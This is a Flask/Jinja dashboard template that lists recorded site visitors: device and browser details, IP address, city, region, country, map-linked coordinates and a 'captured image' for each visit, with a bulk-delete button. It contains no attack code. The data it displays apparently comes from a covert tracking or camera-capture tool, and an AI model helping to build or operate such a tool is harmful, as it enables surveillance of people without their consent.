{% extends 'base.html' %}

{% block title %}Device-Info Visits{% endblock %}
{% block head %}{% endblock %}

{% block content %}
<link rel="stylesheet" href="{{ url_for('static', filename='css/pages/visitors.css') }}" />

<section>
    <button id="clear-page-btn" class="clear-btn">{{ _('Clear Page') }}</button>
    <div class="table-container">
        <table class="data-table">
            <thead>
                <tr>
                    <th>{{ _('System') }}</th>
                    <th>{{ _('Device') }}</th>
                    <th>{{ _('Brand') }}</th>
                    <th>{{ _('Browser') }}</th>
                    <th>{{ _('OS') }}</th>
                    <th>{{ _('Page') }}</th>
                    <th>{{ _('Timestamp') }}</th>
                    <th>{{ _('IP Address') }}</th>
                    <th>{{ _('City') }}</th>
                    <th>{{ _('Region') }}</th>
                    <th>{{ _('Country') }}</th>
                    <th>{{ _('Coordinates') }}</th>
                    <th>{{ _('Capture') }}</th>
                </tr>
            </thead>
            <tbody id="table-body">
                {% for document in documents %}
                <tr data-record-id="{{ document._id }}">
                    <td>{{ document.system }}</td>
                    <td>{{ document.device }}</td>
                    <td>{{ document.brand }}</td>
                    <td>{{ document.browser }}</td>
                    <td>{{ document.os }}</td>
                    <td>{{ document.page }}</td>
                    <td>{{ document.timestamp }}</td>
                    <td>{{ document.ip_address or 'Unknown' }}</td>
                    <td>{{ document.city or 'Unknown' }}</td>
                    <td>{{ document.region or 'Unknown' }}</td>
                    <td>{{ document.country or 'Unknown' }}</td>
                    <td>
                        {% if document.location %}
                        <a href="https://www.google.com/maps?q={{ document.location }}" target="_blank">
                            {{ document.location }}
                        </a>
                        {% else %}
                        {{ _('Unknown') }}
                        {% endif %}
                    </td>
                    <td>
                        <img class="capture_image" src="{{ document.image_capture }}" alt="captured image"
                            onclick="previewImage('{{ document.image_capture }}')" />
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>

    {% set base_url = url_for('pages.device_info') %}
    {% include 'components/pagination.html' %}
</section>

<!-- Modal for previewing the image -->
<div id="image-modal" class="image-modal">
    <span class="close" onclick="closePreview()">&times;</span>
    <img class="modal-content" id="preview-image">
</div>

<script>
    // Function to open the image in a modal
    function previewImage(imageUrl) {
        var modal = document.getElementById("image-modal");
        var modalImg = document.getElementById("preview-image");

        modal.style.display = "block";
        modalImg.src = imageUrl;
    }

    // Function to close the modal
    function closePreview() {
        var modal = document.getElementById("image-modal");
        modal.style.display = "none";
    }

    document.addEventListener("DOMContentLoaded", function () {
        let clearBtn = document.getElementById("clear-page-btn");
        let tableBody = document.getElementById("table-body");

        function updateClearButtonState() {
            if (tableBody && tableBody.children.length === 0) {
                clearBtn.disabled = true;
                clearBtn.classList.add("disabled-btn");
            } else {
                clearBtn.disabled = false;
                clearBtn.classList.remove("disabled-btn");
            }
        }

        // Call function on page load to set the correct state
        updateClearButtonState();
        if (clearBtn) {
            clearBtn.addEventListener("click", function () {
                if (confirm("Are you sure you want to clear all data on this page?")) {
                    let recordsToDelete = [];

                    document.querySelectorAll("#table-body tr").forEach(row => {
                        let recordId = row.dataset.recordId;
                        let imageUrl = row.querySelector(".capture_image")?.src || null;
                        recordsToDelete.push({ _id: recordId, image_capture: imageUrl });
                    });

                    // Show loading spinner
                    showLoading();
                    clearBtn.disabled = true;
                    clearBtn.innerText = "Clearing...";

                    fetch("{{ url_for('pages.delete_page_system_info') }}", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ records: recordsToDelete })
                    })
                        .then(response => response.json())
                        .then(data => {
                            alert(data.message);
                            if (data.status === "success") {
                                location.reload();
                            }
                        })
                        .catch(error => console.error("Error:", error))
                        .finally(() => {
                            // Hide spinner and reset button
                            hideLoading();
                            clearBtn.disabled = false;
                            clearBtn.innerText = "Clear Page";
                        });
                }
            });
        }
    });
</script>

{% endblock %}